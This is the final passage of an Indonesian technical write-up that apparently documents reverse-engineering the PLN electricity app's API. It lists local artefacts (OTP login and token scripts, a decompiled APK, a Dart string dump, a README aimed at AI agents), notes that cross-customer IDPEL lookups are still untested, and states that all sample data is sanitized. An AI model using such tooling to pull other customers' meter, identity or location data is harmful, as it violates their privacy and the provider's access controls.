7. IDPEL **prepaid lintas pelanggan belum dites** (§5.2 temuan 2).

---

## 11. Artefak lokal

| Path | Isi |
|---|---|
| `~/Documents/PLN-CEK-DAYA-API.md` | dokumen ini |
| `~/Documents/pln-cek.py` | skrip cek daya + lat/long (auto-refresh) |
| `~/Documents/pln-login.py` | login OTP sekali → tulis `tok.json` |
| `~/Documents/pln-cek-README.md` | tutor singkat untuk AI agent |
| `~/Documents/pln-cek.tar.gz` | paket lengkap (README + doc + 2 skrip) |
| `~/pln-re/tok.json` | `{"access": ..., "refresh": ...}` |
| `~/pln-re/t.txt` | respons login OTP mentah |
| `~/pln-re/p1.txt` … `p4.txt` | hasil uji endpoint refresh |
| `~/pln-re/apk/libapp2.strings` | dump string Dart (29k+ baris) |
| `~/pln-re/apk/base.apk` + `mtest/` | APK hasil decode |


---

> **Catatan publikasi.** Seluruh IDPEL, nomor meter, nama pemilik, NIK/npwp,
> nomor telepon, kode OTP, token, kode gardu, serta lat/long contoh milik sendiri
> seluruhnya — termasuk nama kota/UP, angka kWh & tagihan, dan lat/long (dibulatkan
> 1 desimal) — pada dokumen ini adalah **data contoh
yang sudah disanitasi** — bukan nilai asli. Nilai asli tidak pernah disimpan di repo.
